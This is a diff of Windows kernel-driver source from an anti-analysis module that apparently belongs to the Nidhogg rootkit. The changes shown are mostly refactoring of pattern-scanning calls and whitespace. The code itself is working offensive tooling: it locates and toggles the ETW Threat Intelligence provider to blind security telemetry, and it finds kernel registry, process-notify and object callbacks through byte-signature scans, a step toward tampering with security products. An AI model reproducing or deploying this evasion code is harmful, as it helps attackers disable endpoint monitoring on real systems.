@@ -47,7 +47,7 @@ NTSTATUS AntiAnalysis::EnableDisableEtwTI(bool enable) {
 	ULONG foundIndex = 0;
 	SIZE_T bytesWritten = 0;
 	SIZE_T etwThreatIntProvRegHandleSigLen = sizeof(EtwThreatIntProvRegHandleSignature1);
-	
+
 	// Getting the location of KeInsertQueueApc dynamically to get the real location.
 	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"KeInsertQueueApc");
 	PVOID searchedRoutineAddress = MmGetSystemRoutineAddress(&routineName);
@@ -56,16 +56,16 @@ NTSTATUS AntiAnalysis::EnableDisableEtwTI(bool enable) {
 		return STATUS_NOT_FOUND;
 
 	SIZE_T targetFunctionDistance = EtwThreatIntProvRegHandleDistance;
-	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PUCHAR)&EtwThreatIntProvRegHandleSignature1,
-																		 0xCC, etwThreatIntProvRegHandleSigLen - 1,
-																		 searchedRoutineAddress, targetFunctionDistance,
-																		 &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
+	PLONG searchedRoutineOffset = (PLONG)FindPattern((PUCHAR)&EtwThreatIntProvRegHandleSignature1,
+		0xCC, etwThreatIntProvRegHandleSigLen - 1,
+		searchedRoutineAddress, targetFunctionDistance,
+		&foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
 
 	if (!searchedRoutineOffset) {
-		searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PUCHAR)&EtwThreatIntProvRegHandleSignature2,
-																	   0xCC, etwThreatIntProvRegHandleSigLen - 1,
-																	   searchedRoutineAddress, targetFunctionDistance,
-																	   &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
+		searchedRoutineOffset = (PLONG)FindPattern((PUCHAR)&EtwThreatIntProvRegHandleSignature2,
+			0xCC, etwThreatIntProvRegHandleSigLen - 1,
+			searchedRoutineAddress, targetFunctionDistance,
+			&foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
 
 		if (!searchedRoutineOffset)
 			return STATUS_NOT_FOUND;
@@ -309,7 +309,8 @@ NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64
 	PVOID searchedRoutineAddress = (PVOID)CmRegisterCallback;
 	SIZE_T targetFunctionDistance = CmpRegisterCallbackInternalSignatureDistance;
 
-	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)&CallFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
+	PLONG searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)&CallFunctionSignature, 0xCC, targetFunctionSigLen - 1,
+		searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
 
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
@@ -319,24 +320,28 @@ NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64
 	targetFunctionSigLen = sizeof(CmpInsertCallbackInListByAltitudeSignature);
 	targetFunctionDistance = CmpInsertCallbackInListByAltitudeSignatureDistance;
 
-	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)&CmpInsertCallbackInListByAltitudeSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
+	searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)&CmpInsertCallbackInListByAltitudeSignature, 0xCC,
+		targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex,
+		(ULONG)(targetFunctionSigLen - 1));
 
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
 
-	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset) + foundIndex + CmpInsertCallbackInListByAltitudeOffset;
+	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CmpInsertCallbackInListByAltitudeOffset;
 
 	// Get CallbackListHead and CmpCallBackCount.
 	SIZE_T listHeadSignatureLen = sizeof(CallbackListHeadSignature);
 	targetFunctionDistance = CallbackListHeadSignatureDistance;
 	SIZE_T listHeadCountSignatureLen = sizeof(RoutinesListCountSignature);
-	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)&CallbackListHeadSignature, 0xCC, listHeadSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)listHeadSignatureLen);
+	searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)&CallbackListHeadSignature, 0xCC, listHeadSignatureLen - 1,
+		searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)listHeadSignatureLen);
 
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
 
 	PUCHAR callbacksList = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + RoutinesListOffset;
-	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)&RoutinesListCountSignature, 0xCC, listHeadCountSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(listHeadCountSignatureLen - 1));
+	searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)&RoutinesListCountSignature, 0xCC, listHeadCountSignatureLen - 1,
+		searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(listHeadCountSignatureLen - 1));
 
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
@@ -345,7 +350,9 @@ NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64
 
 	// Get CmpCallbackListLock.
 	SIZE_T callbacksListLockSignatureLen = sizeof(CmpCallbackListLockSignature);
-	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)&CmpCallbackListLockSignature, 0xCC, callbacksListLockSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(callbacksListLockSignatureLen - 1));
+	searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)&CmpCallbackListLockSignature, 0xCC,
+		callbacksListLockSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex,
+		(ULONG)(callbacksListLockSignatureLen - 1));
 
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
@@ -365,7 +372,7 @@ NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64
 
 			if (NT_SUCCESS(MatchCallback((PVOID)Callbacks->Callbacks[i].CallbackAddress, driverName))) {
 				err = strcpy_s(Callbacks->Callbacks[i].DriverName, driverName);
-				
+
 				if (err != 0) {
 					status = STATUS_ABANDONED;
 					break;
@@ -453,21 +460,24 @@ NTSTATUS AntiAnalysis::ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 R
 	listCountSigLen = sizeof(RoutinesListCountSignature);
 	countOffset = RoutinesListOffset;
 
-	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)CallFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
+	PLONG searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)CallFunctionSignature, 0xCC, targetFunctionSigLen - 1,
+		searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));
 
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
 
 	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CallFunctionOffset;
 
-	PLONG routinesListOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listSignature, 0xCC, listSigLen - 1, searchedRoutineAddress, listDistance, &foundIndex, (ULONG)listSigLen);
+	PLONG routinesListOffset = (PLONG)FindPattern((PCUCHAR)listSignature, 0xCC, listSigLen - 1, searchedRoutineAddress,
+		listDistance, &foundIndex, (ULONG)listSigLen);
 
 	if (!routinesListOffset)
 		return STATUS_NOT_FOUND;
 
 	PUCHAR routinesList = (PUCHAR)searchedRoutineAddress + *(routinesListOffset)+foundIndex + RoutinesListOffset;
 
-	PLONG routinesLengthOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)RoutinesListCountSignature, 0xCC, listCountSigLen - 1, searchedRoutineAddress, listDistance, &foundIndex, (ULONG)(listCountSigLen - 1));
+	PLONG routinesLengthOffset = (PLONG)FindPattern((PCUCHAR)RoutinesListCountSignature, 0xCC, listCountSigLen - 1,
+		searchedRoutineAddress, listDistance, &foundIndex, (ULONG)(listCountSigLen - 1));
 
 	if (!routinesLengthOffset)
 		return STATUS_NOT_FOUND;
@@ -477,7 +487,7 @@ NTSTATUS AntiAnalysis::ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 R
 	else if (Callbacks->Type == PsCreateThreadTypeNonSystemThread)
 		countOffset = PsNotifyRoutinesRoutineCountOffset;
 
-	ULONG routinesCount = *(PLONG)((PUCHAR)searchedRoutineAddress + *(routinesLengthOffset) + foundIndex + countOffset);
+	ULONG routinesCount = *(PLONG)((PUCHAR)searchedRoutineAddress + *(routinesLengthOffset)+foundIndex + countOffset);
 
 	for (SIZE_T i = 0; i < routinesCount; i++) {
 		currentRoutine = *(PULONG64)(routinesList + (i * 8));
@@ -569,7 +579,7 @@ NTSTATUS AntiAnalysis::ListObCallbacks(ObCallbacksList* Callbacks) {
 				if (currentObjectCallback->PreOperation) {
 					if (NT_SUCCESS(MatchCallback(currentObjectCallback->PreOperation, driverName))) {
 						err = strcpy_s(Callbacks->Callbacks[index].DriverName, strlen(driverName), driverName);
-						
+
 						if (err != 0) {
 							status = STATUS_ABANDONED;
 							break;
